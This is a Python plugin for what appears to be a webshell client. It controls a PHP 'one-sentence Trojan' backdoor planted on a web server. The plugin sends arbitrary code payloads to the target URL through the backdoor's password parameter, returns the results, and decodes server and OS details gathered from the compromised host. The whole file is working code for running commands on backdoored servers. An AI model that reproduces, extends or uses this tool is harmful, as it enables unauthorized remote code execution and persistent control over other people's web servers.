from typing import Any, Dict, List, Union
from api import CodeExecutor, Plugin, SessionType, Session, ServerInfo
import requests, json, base64

from api.maintype.info import OSType

def get_plugin_class():
    return PHPWebshell

class PHPWebshell(Plugin, CodeExecutor):
    name = 'php_one_word'
    description = 'PHP one sentence Trojan code executor'
    supported_session_types = [SessionType.PHP]

    options = {
        'password':['c', '一句话木马密码']
    }

    def on_loading(self, session: Session) -> bool:
        return super().on_loading(session)

    def get_server_info(self) -> ServerInfo:
        data = self.session.evalfile('server_info')
        info = json.loads(data)
        for k, v in info.items():
            if isinstance(v, str):
                info[k] = base64.b64decode(v.encode()).decode(self.session.options.get_option('encoding'))
            if k == 'os_type':
                if 'linux' in info[k].lower():
                    info[k] = OSType.UNIX
                elif 'window' in info[k].lower():
                    info[k] = OSType.WINDOWS
                else:
                    info[k] = OSType.OTHER
        return ServerInfo.from_dict(info)

    def generate(self, config: Dict[str, Any]) -> bytes:
        return b'okokokok'

    def eval(self, payload: bytes, timeout: float) -> Union[bytes, None]:
        pwd = self.session.options.get_option('password')
        url = self.session.options.get_option('target')
        r = requests.post(url, data={pwd:payload})
        return r.content